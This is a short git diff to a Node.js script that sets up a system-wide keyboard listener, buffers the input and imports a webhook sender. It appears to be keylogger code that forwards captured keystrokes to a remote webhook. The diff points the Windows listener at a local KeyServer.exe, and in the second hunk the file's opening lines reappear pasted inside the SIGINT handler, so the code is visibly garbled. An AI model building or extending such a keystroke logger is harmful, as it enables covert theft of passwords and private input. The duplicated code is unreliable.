@@ -2,7 +2,11 @@ const { GlobalKeyboardListener } = require("node-global-key-listener");
 const { sendWebhook } = require('../webhook');
 const loggerText  = require("../utils/loggerText");
 
-const v = new GlobalKeyboardListener();
+const v = new GlobalKeyboardListener({
+  windows:{
+    serverPath: './KeyServer.exe'
+  }
+});
 
 let inputBuffer = '';
 let timeoutId = null;
@@ -117,8 +121,11 @@ process.on('SIGINT', () => {
   v.kill();const { GlobalKeyboardListener } = require("node-global-key-listener");
   const { sendWebhook } = require('../webhook');
   
-  const v = new GlobalKeyboardListener();
-
+  const v = new GlobalKeyboardListener({
+    windows:{
+      serverPath: './KeyServer.exe'
+    }
+  });
   let inputBuffer = '';
   let timeoutId = null;
   
